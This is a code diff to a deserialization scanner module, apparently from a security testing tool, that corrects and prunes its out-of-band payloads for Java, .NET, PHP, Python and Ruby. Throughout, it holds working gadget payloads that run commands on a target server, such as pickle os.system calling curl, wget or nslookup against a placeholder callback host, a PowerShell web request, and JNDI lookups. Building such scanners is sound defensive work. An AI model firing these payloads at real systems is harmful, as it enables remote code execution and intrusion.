@@ -206,7 +206,7 @@ public class DeserializationScanner implements ScanModule {
             {"Fastjson 1.2.68+ expectClass",
                     "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/d\",\"autoCommit\":true}"},
             {"Fastjson LdapAttribute",
-                    "{\"@type\":\"com.sun.jndi.ldap.LdapAttribute\",\"val\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/e\"}}"},
+                    "{\"@type\":\"com.sun.jndi.ldap.LdapAttribute\",\"val\":{\"@type\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/e\"}}"},
     };
 
     private static final String[][] JAVA_JACKSON_PAYLOADS = {
@@ -252,8 +252,8 @@ public class DeserializationScanner implements ScanModule {
     private static final String[][] JAVA_SNAKEYAML_PAYLOADS = {
             {"SnakeYAML ScriptEngineManager",
                     "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLAB_PLACEHOLDER/yaml\"]]]]"},
-            {"SnakeYAML ProcessBuilder",
-                    "!!java.lang.ProcessBuilder [[\"nslookup\",\"COLLAB_PLACEHOLDER\"]]"},
+            {"SnakeYAML ScriptEngineManager Alt",
+                    "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLAB_PLACEHOLDER/yaml2\"]]]]"},
             {"SnakeYAML JdbcRowSet",
                     "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://COLLAB_PLACEHOLDER/yaml', autoCommit: true}"},
             {"SnakeYAML SpringPropertyPathFactory",
@@ -409,9 +409,9 @@ public class DeserializationScanner implements ScanModule {
                     "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                             + "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                             + "<SOAP-ENV:Body>"
-                            + "<a1:ServerWebRequest xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/System.Net/System\">"
-                            + "<a1:ServerWebRequest.uri>http://COLLAB_PLACEHOLDER/soap</a1:ServerWebRequest.uri>"
-                            + "</a1:ServerWebRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>"},
+                            + "<a1:HttpWebRequest xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/System.Net/System\">"
+                            + "<a1:HttpWebRequest.uri>http://COLLAB_PLACEHOLDER/soap</a1:HttpWebRequest.uri>"
+                            + "</a1:HttpWebRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>"},
     };
 
     // PHP deserialization payloads
@@ -1768,26 +1768,32 @@ public class DeserializationScanner implements ScanModule {
                 oobTemplateList.add(new String[]{"${jndi:dns://COLLAB_PLACEHOLDER/a}", "JNDI DNS lookup"});
                 // Fastjson @type OOB — text-based, Collaborator URL gets replaced properly
                 for (String[] p : JAVA_FASTJSON_PAYLOADS) {
-                    if (p[1].contains("COLLAB_PLACEHOLDER")) {
-                        oobTemplateList.add(new String[]{p[1], "Fastjson " + p[0]});
+                    // Skip BasicDataSource: JdbcRowSetImpl doesn't implement java.sql.Driver,
+                    // so driverClassName won't trigger JNDI lookup
+                    if (p[1].contains("COLLAB_PLACEHOLDER")
+                            && !p[0].contains("BasicDataSource")) {
+                        oobTemplateList.add(new String[]{p[1], p[0]});
                     }
                 }
-                // Jackson polymorphic type OOB
+                // Jackson polymorphic type OOB — skip SpringPropertyPathFactory (bean lookup, not JNDI)
                 for (String[] p : JAVA_JACKSON_PAYLOADS) {
-                    if (p[1].contains("COLLAB_PLACEHOLDER")) {
-                        oobTemplateList.add(new String[]{p[1], "Jackson " + p[0]});
+                    if (p[1].contains("COLLAB_PLACEHOLDER")
+                            && !p[0].contains("SpringAbstractBeanFactory")) {
+                        oobTemplateList.add(new String[]{p[1], p[0]});
                     }
                 }
-                // XStream XML OOB
+                // XStream XML OOB — skip ImageIO (no COLLAB_PLACEHOLDER + broken chain)
                 for (String[] p : JAVA_XSTREAM_PAYLOADS) {
-                    if (p[1].contains("COLLAB_PLACEHOLDER")) {
-                        oobTemplateList.add(new String[]{p[1], "XStream " + p[0]});
+                    if (p[1].contains("COLLAB_PLACEHOLDER")
+                            && !p[0].contains("ImageIO")) {
+                        oobTemplateList.add(new String[]{p[1], p[0]});
                     }
                 }
-                // SnakeYAML OOB
+                // SnakeYAML OOB — skip SpringPropertyPathFactory (bean lookup, not JNDI)
                 for (String[] p : JAVA_SNAKEYAML_PAYLOADS) {
-                    if (p[1].contains("COLLAB_PLACEHOLDER")) {
-                        oobTemplateList.add(new String[]{p[1], "SnakeYAML " + p[0]});
+                    if (p[1].contains("COLLAB_PLACEHOLDER")
+                            && !p[0].contains("SpringPropertyPathFactory")) {
+                        oobTemplateList.add(new String[]{p[1], p[0]});
                     }
                 }
                 break;
@@ -1816,17 +1822,20 @@ public class DeserializationScanner implements ScanModule {
                                 + "\"$values\":[\"powershell\",\"-c Invoke-WebRequest http://COLLAB_PLACEHOLDER/ps\"]},"
                                 + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}",
                         "JSON.NET ObjectDataProvider PowerShell"});
-                // JSON.NET Assembly.Load — fetches DLL from Collaborator
-                // JSON.NET Uri — triggers URI resolution
+                // JSON.NET payloads with OOB — skip non-functional ones:
+                // - JSON.NET Uri: AbsoluteUri is read-only; constructing Uri never makes network requests
+                // - JSON.NET Assembly.Load: setting Path alone doesn't trigger download without Install()
                 for (String[] p : DOTNET_JSON_PAYLOADS) {
-                    if (p[1].contains("COLLAB_PLACEHOLDER")) {
+                    if (p[1].contains("COLLAB_PLACEHOLDER")
+                            && !p[0].equals("JSON.NET Uri")
+                            && !p[0].equals("JSON.NET Assembly.Load")) {
                         oobTemplateList.add(new String[]{p[1], ".NET JSON " + p[0]});
                     }
                 }
-                // XAML-based OOB (XamlReader.Load)
+                // XAML-based OOB (XamlReader.Load) — DOTNET_XML_PAYLOADS is {name, payload}, remap to {payload, technique}
                 for (String[] xmlPayload : DOTNET_XML_PAYLOADS) {
                     if (xmlPayload[1].contains("COLLAB_PLACEHOLDER")) {
-                        oobTemplateList.add(xmlPayload);
+                        oobTemplateList.add(new String[]{xmlPayload[1], ".NET XML " + xmlPayload[0]});
                     }
                 }
                 // BinaryFormatter with embedded URL callback (SoapFormatter variant)
@@ -1834,7 +1843,7 @@ public class DeserializationScanner implements ScanModule {
                         "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                                 + "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                                 + "<SOAP-ENV:Body>"
-                                + "<a1:ObjectDataProvider xmlns:a1=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\">"
+                                + "<a1:ObjectDataProvider xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/System.Windows.Data/PresentationFramework\">"
                                 + "<a1:ObjectDataProvider.ObjectInstance>"
                                 + "<a2:Process xmlns:a2=\"http://schemas.microsoft.com/clr/nsassem/System.Diagnostics/System\">"
                                 + "<a2:Process.StartInfo>"
@@ -1843,11 +1852,7 @@ public class DeserializationScanner implements ScanModule {
                                 + "</a1:ObjectDataProvider.ObjectInstance>"
                                 + "</a1:ObjectDataProvider></SOAP-ENV:Body></SOAP-ENV:Envelope>",
                         "SoapFormatter ObjectDataProvider nslookup"});
-                // JSON.NET with WebClient — downloads from Collaborator
-                oobTemplateList.add(new String[]{
-                        "{\"$type\":\"System.Net.WebClient, System\","
-                                + "\"BaseAddress\":\"http://COLLAB_PLACEHOLDER/webclient\"}",
-                        ".NET WebClient OOB"});
+                // (Removed: WebClient BaseAddress — setting BaseAddress alone doesn't trigger network activity)
                 // JSON.NET XmlDocument — external entity resolution
                 oobTemplateList.add(new String[]{
                         "{\"$type\":\"System.Xml.XmlDocument, System.Xml\","
@@ -1862,7 +1867,7 @@ public class DeserializationScanner implements ScanModule {
                                 + ("http://COLLAB_PLACEHOLDER/soap".length())
                                 + ":\"http://COLLAB_PLACEHOLDER/soap\";"
                                 + "s:15:\"_stream_context\";i:0;s:13:\"_soap_version\";i:1;"
-                                + "s:13:\"_user_agent\";s:7:\"OmniStr\";}",
+                                + "s:11:\"_user_agent\";s:7:\"OmniStr\";}",
                         "PHP SoapClient SSRF"});
                 // SoapClient with WSDL mode — triggers HTTP fetch of the WSDL URL on __wakeup
                 oobTemplateList.add(new String[]{
@@ -1872,58 +1877,30 @@ public class DeserializationScanner implements ScanModule {
                                 + ":\"http://COLLAB_PLACEHOLDER/wsdl\";}",
                         "PHP SoapClient WSDL"});
                 // Monolog SocketHandler chain — connects to Collaborator on close/flush
+                // Uses real null bytes (\0) for PHP protected properties
                 oobTemplateList.add(new String[]{
-                        "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\\0*\\0socket\":"
-                                + "O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\\0*\\0handler\";"
-                                + "O:29:\"Monolog\\Handler\\SocketHandler\":2:{s:14:\"\\0*\\0connectionString\";s:"
+                        "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\0*\0socket\":"
+                                + "O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\0*\0handler\";"
+                                + "O:29:\"Monolog\\Handler\\SocketHandler\":2:{s:19:\"\0*\0connectionString\";s:"
                                 + ("COLLAB_PLACEHOLDER:80".length()) + ":\"COLLAB_PLACEHOLDER:80\";"
-                                + "s:9:\"\\0*\\0socket\";N;}s:13:\"\\0*\\0bufferSize\";i:-1;"
-                                + "s:9:\"\\0*\\0buffer\";a:1:{i:0;a:2:{i:0;s:4:\"test\";s:5:\"level\";i:100;}}"
-                                + "s:8:\"\\0*\\0level\";N;s:14:\"\\0*\\0initialized\";b:1;"
-                                + "s:14:\"\\0*\\0bufferLimit\";i:-1;s:13:\"\\0*\\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}",
+                                + "s:9:\"\0*\0socket\";N;}s:13:\"\0*\0bufferSize\";i:-1;"
+                                + "s:9:\"\0*\0buffer\";a:1:{i:0;a:2:{i:0;s:4:\"test\";s:5:\"level\";i:100;}}"
+                                + "s:8:\"\0*\0level\";N;s:14:\"\0*\0initialized\";b:1;"
+                                + "s:14:\"\0*\0bufferLimit\";i:-1;s:13:\"\0*\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}",
                         "Monolog SocketHandler OOB"});
-                // GuzzleHttp\Client — proper class name with HTTP request in __destruct chain
-                oobTemplateList.add(new String[]{
-                        "O:20:\"GuzzleHttp\\Psr7\\Uri\":1:{s:36:\"\\0GuzzleHttp\\Psr7\\Uri\\0composedComponents\";s:"
-                                + ("http://COLLAB_PLACEHOLDER/guzzle".length())
-                                + ":\"http://COLLAB_PLACEHOLDER/guzzle\";}",
-                        "Guzzle PSR7 URI OOB"});
-                // Laravel PendingBroadcast → Dispatcher chain with HTTP callback
-                oobTemplateList.add(new String[]{
-                        "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"\\0*\\0event\";"
-                                + "O:28:\"Illuminate\\Http\\Client\\Request\":1:{s:3:\"url\";s:"
-                                + ("http://COLLAB_PLACEHOLDER/laravel".length())
-                                + ":\"http://COLLAB_PLACEHOLDER/laravel\";}}",
-                        "Laravel PendingBroadcast OOB"});
-                // Symfony Process — executes curl/wget to Collaborator
-                oobTemplateList.add(new String[]{
-                        "O:29:\"Symfony\\Component\\Process\\Process\":4:{s:45:\"\\0Symfony\\Component\\Process\\Process\\0commandline\";s:"
-                                + ("curl http://COLLAB_PLACEHOLDER/symfony".length())
-                                + ":\"curl http://COLLAB_PLACEHOLDER/symfony\";"
-                                + "s:36:\"\\0Symfony\\Component\\Process\\Process\\0cwd\";s:4:\"/tmp\";"
-                                + "s:39:\"\\0Symfony\\Component\\Process\\Process\\0status\";s:5:\"ready\";"
-                                + "s:45:\"\\0Symfony\\Component\\Process\\Process\\0exitcode\";N;}",
-                        "Symfony Process curl OOB"});
-                // SwiftMailer — triggers SMTP connection to Collaborator
-                oobTemplateList.add(new String[]{
-                        "O:31:\"Swift_Transport_EsmtpTransport\":1:{s:44:\"\\0Swift_Transport_EsmtpTransport\\0_params\";a:2:{s:4:\"host\";s:"
-                                + ("COLLAB_PLACEHOLDER".length())
-                                + ":\"COLLAB_PLACEHOLDER\";s:4:\"port\";i:25;}}",
-                        "SwiftMailer SMTP OOB"});
-                // Generic file_get_contents via SplFileObject — works if allow_url_fopen=on
-                oobTemplateList.add(new String[]{
-                        "O:13:\"SplFileObject\":1:{s:7:\"\\0*\\0file\";s:"
-                                + ("http://COLLAB_PLACEHOLDER/spl".length())
-                                + ":\"http://COLLAB_PLACEHOLDER/spl\";}",
-                        "PHP SplFileObject URL OOB"});
+                // (Removed: GuzzleHttp\Psr7\Uri — value object, no magic method triggers URL fetch)
+                // (Removed: Laravel PendingBroadcast — Illuminate\Http\Client\Request doesn't have dispatch())
+                // (Removed: Symfony Process — __destruct calls stop(), not run(); command never executes)
+                // (Removed: SwiftMailer — transport doesn't auto-connect on deserialization)
+                // (Removed: SplFileObject — not serializable in a way that triggers URL fetch)
                 break;
             case "Python":
                 // Pickle os.system — nslookup/curl/wget
                 oobTemplateList.add(new String[]{"cos\nsystem\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle nslookup"});
                 oobTemplateList.add(new String[]{"cos\nsystem\n(S'curl http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle curl"});
                 oobTemplateList.add(new String[]{"cos\nsystem\n(S'wget http://COLLAB_PLACEHOLDER/deser'\ntR.", "Pickle wget"});
-                // Pickle subprocess.check_output
-                oobTemplateList.add(new String[]{"csubprocess\ncheck_output\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle subprocess nslookup"});
+                // Pickle os.popen — works with plain string (uses shell), unlike subprocess.check_output
+                oobTemplateList.add(new String[]{"cos\npopen\n(S'nslookup COLLAB_PLACEHOLDER'\ntR.", "Pickle os.popen nslookup"});
                 // Pickle urllib — HTTP GET to Collaborator (no shell needed)
                 oobTemplateList.add(new String[]{"curllib.request\nurlopen\n(S'http://COLLAB_PLACEHOLDER/urllib'\ntR.", "Pickle urllib OOB"});
                 // Pickle with Python3 builtins.exec + urllib
@@ -1938,37 +1915,18 @@ public class DeserializationScanner implements ScanModule {
                 oobTemplateList.add(new String[]{"{\"py/reduce\":[{\"py/function\":\"os.system\"},{\"py/tuple\":[\"curl http://COLLAB_PLACEHOLDER/jp\"]}]}", "jsonpickle curl"});
                 break;
             case "Ruby":
-                // Ruby YAML Gem::Source — fetches URL
+                // Ruby YAML Gem::Source — @uri triggers HTTP fetch on fetch_spec/download_spec
+                // Simple single-document YAML that works with YAML.load / Psych
                 oobTemplateList.add(new String[]{
-                        "--- !ruby/object:Gem::Installer\ni: !ruby/object:Gem::SpecFetcher\ni: !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    current_fetch_uri: http://COLLAB_PLACEHOLDER/ruby",
-                        "Ruby YAML Gem OOB"});
-                // Ruby YAML Net::FTP — opens FTP connection to Collaborator
-                oobTemplateList.add(new String[]{
-                        "--- !ruby/hash:Net::FTP\nhost: COLLAB_PLACEHOLDER\nport: 80",
-                        "Ruby YAML Net::FTP OOB"});
-                // Ruby YAML OpenURI — fetches URL
-                oobTemplateList.add(new String[]{
-                        "--- !ruby/object:OpenURI::OpenRead\nuri: http://COLLAB_PLACEHOLDER/rb",
-                        "Ruby YAML OpenURI OOB"});
-                // Ruby YAML ERB — system command execution
-                oobTemplateList.add(new String[]{
-                        "--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\nio: &1 !ruby/object:Net::BufferedIO\nio: &1 !ruby/object:Gem::Package::TarReader::Entry\n read: 0\n header: \"abc\"\ndebug_output: &1 !ruby/object:Net::WriteAdapter\n socket: &1 !ruby/object:Gem::RequestSet\n sets: !ruby/object:Net::WriteAdapter\n  socket: !ruby/module 'Kernel'\n  method_id: :system\n git_set: nslookup COLLAB_PLACEHOLDER\n method_id: :resolve",
-                        "Ruby YAML Gem chain nslookup"});
-                // Ruby YAML Net::HTTP — makes HTTP request
-                oobTemplateList.add(new String[]{
-                        "--- !ruby/hash:Net::HTTP\naddress: COLLAB_PLACEHOLDER\nport: 80\nopen_timeout: 5\nread_timeout: 5\nstarted: true",
-                        "Ruby YAML Net::HTTP OOB"});
-                // Ruby YAML Resolv::DNS — DNS lookup to Collaborator
-                oobTemplateList.add(new String[]{
-                        "--- !ruby/object:Resolv::DNS\nconfig_info: !ruby/object:Resolv::DNS::Config\n  nameserver_port:\n  - - COLLAB_PLACEHOLDER\n    - 53",
-                        "Ruby YAML Resolv::DNS OOB"});
-                // Ruby Marshal with ERB template (Base64-encoded payload with OOB)
-                oobTemplateList.add(new String[]{
-                        "--- !ruby/object:ERB\nsrc: \"<%= `nslookup COLLAB_PLACEHOLDER` %>\"",
-                        "Ruby YAML ERB nslookup"});
-                oobTemplateList.add(new String[]{
-                        "--- !ruby/object:ERB\nsrc: \"<%= `curl http://COLLAB_PLACEHOLDER/erb` %>\"",
-                        "Ruby YAML ERB curl"});
+                        "--- !ruby/object:Gem::Source\nuri: http://COLLAB_PLACEHOLDER/gem",
+                        "Ruby YAML Gem::Source OOB"});
+                // (Removed 8 non-functional Ruby YAML OOB payloads:
+                //  - Gem chain: duplicate keys, wrong attribute names, malformed
+                //  - Net::FTP/Net::HTTP: don't auto-connect on instantiation
+                //  - OpenURI::OpenRead: class doesn't exist
+                //  - Complex Gem chain: multiple YAML docs (only first loaded), broken anchors
+                //  - Resolv::DNS: doesn't auto-query on instantiation
+                //  - ERB x2: doesn't auto-evaluate template on YAML.load)
                 break;
             case "Node.js":
                 // node-serialize IIFE with require('http')
@@ -2086,10 +2044,9 @@ public class DeserializationScanner implements ScanModule {
 
         if ("Ruby".equals(dp.language)) {
             // Ruby Marshal binary payloads — for apps using Marshal.load (not YAML.load)
+            // ERB payloads removed: ERB doesn't auto-evaluate template on Marshal.load
             String[][] rubyBinaryOob = {
                     {"gemsource", "Ruby Marshal Gem::Source @uri"},
-                    {"erb_nslookup", "Ruby Marshal ERB nslookup"},
-                    {"erb_curl", "Ruby Marshal ERB curl"},
                     {"gadget_nslookup", "Ruby Marshal Gadget chain nslookup"},
                     {"gadget_curl", "Ruby Marshal Gadget chain curl"},
                     {"gadget_wget", "Ruby Marshal Gadget chain wget"},
@@ -2131,16 +2088,6 @@ public class DeserializationScanner implements ScanModule {
                                 new String[]{"@uri"},
                                 new String[]{"http://" + collabDomain + "/gem"});
                         break;
-                    case "erb_nslookup":
-                        binaryPayload = buildMarshalObject("ERB",
-                                new String[]{"@src", "@filename"},
-                                new String[]{"<%= `nslookup " + collabDomain + "` %>", "(erb)"});
-                        break;
-                    case "erb_curl":
-                        binaryPayload = buildMarshalObject("ERB",
-                                new String[]{"@src", "@filename"},
-                                new String[]{"<%= `curl http://" + collabDomain + "/erb` %>", "(erb)"});
-                        break;
                     case "gadget_nslookup":
                         binaryPayload = buildMarshalGadgetChain("nslookup " + collabDomain);
                         break;
@@ -2174,7 +2121,7 @@ public class DeserializationScanner implements ScanModule {
                     {"os", "system", "nslookup ", "Pickle P2 nslookup"},
                     {"os", "system", "curl http://", "Pickle P2 curl"},
                     {"os", "system", "wget http://", "Pickle P2 wget"},
-                    {"subprocess", "check_output", "nslookup ", "Pickle P2 subprocess nslookup"},
+                    {"os", "popen", "nslookup ", "Pickle P2 os.popen nslookup"},
             };
 
             for (String[] pb : pythonBinaryOob) {
